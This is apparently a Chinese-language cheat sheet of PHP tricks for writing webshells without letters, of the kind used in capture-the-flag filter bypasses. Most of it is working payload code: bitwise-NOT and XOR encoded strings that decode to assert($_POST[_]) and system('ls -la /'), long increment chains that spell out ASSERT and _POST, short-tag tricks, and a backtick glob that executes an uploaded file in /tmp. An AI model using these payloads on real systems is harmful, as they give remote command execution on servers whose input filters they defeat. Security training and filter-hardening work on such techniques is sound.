# 无字母webshell

## 位运算法

### 取反法

> 用CyberChef 辅助 NOT

- 需求条件：可以使用`~_()`以及任意一种引号

```bash
$_ = ~"%9e%8c%8c%9a%8d%8b";   # 得到assert，此时$_="assert"
$__ = ~"%a0%af%b0%ac%ab";   # 得到_POST，此时$__="_POST"
$___ = $$__;   # $___=$_POST
$_($___[_]);   # assert($_POST[_])
```

```php
$_ = ~"%8c%86%8c%8b%9a%92";   # 得到 system
$__ = ~"%93%8c%df%d2%93%9e%df%d0";   # 得到 ls -la /
$_($__);   # system("ls -la /")
```

如果过滤`$`（仅php7）

```php
(~"%8c%86%8c%8b%9a%92")(~"%93%8c%df%d2%93%9e%df%d0");
```

### 异或法

- 需求条件：可以使用`^$_.=+()[]{}`以及任意一种引号

使用CyberChef XOR

```php
("%aa%aa%aa%aa%aa%aa"^"%d9%d3%d9%de%cf%c7")("%aa%aa%aa%aa%aa%aa%aa%aa"^"%c6%d9%8a%87%c6%cb%8a%85");
# system("ls -la /")
```

## 自增法

- 需求条件: 可以使用`$_.=+()[]`以及任意一种引号

```php
$_=[].'';   //得到"Array"
$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__ = $___;   //$__="A"
$_ = $___;   //$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$___ .= $__;   //$___="AS"
$___ .= $__;   //$___="ASS"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
$___ .= $__;   //$___="ASSE"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
$___ .= $__;   //$___="ASSER"
$__++;$__++;   //得到"T"，此时$__="T"
$___ .= $__;   //$___="ASSERT"
$__ = $_;   //$__="A"
$____ = "_";   //$____="_"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
$____ .= $__;   //$____="_P"
$__ = $_;   //$__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
$____ .= $__;   //$____="_PO"
$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
$____ .= $__;   //$____="_POS"
$__++;   //得到"T"，此时$__="T"
$____ .= $__;   //$____="_POST"
$_ = $$____;   //$_=$_POST
$___($_[_]);   //ASSERT($POST[_])
```

```php
<?php
$_=[].'';
$__ = $_[$__];

$___=$__;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # S
$___=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # Y
$___.=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # S
$___.=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # T
$___.=$_;

$_=$__;
$_++;$_++;$_++;$_++; # E
$___.=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # M
$___.=$_;

# Arg

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # P
$____=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # O
$____.=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # S
$____.=$_;

$_=$__;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; # T
$____.=$_;

$____='_'.$____;

$___($$____[''=='']);

// $_POST[$____]


// echo $____;


# system
```

## 无法用`;`结束一行

在php5.4及更高版本使用`<?= 123 ?>`语法即可

短标签要先把原来的php代码闭合

```php
<?php

eval('?><?= 123 ?>');
```

php5.4更低版本开启short_open_tag配置项也可以使用上述语法

## PHP5过滤`$`

> 参考：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

知识点1

```
`` 可以用于在php中直接执行执行系统命令
```

知识点2

上传的文件会被临时保存在`/tmp`



用`[@-[]`表示大写字符

```python
chr(ord('A')-1)
chr(ord('Z')+1)
```





```php
`. /???/????????[@-[]`;
```



默认无回显
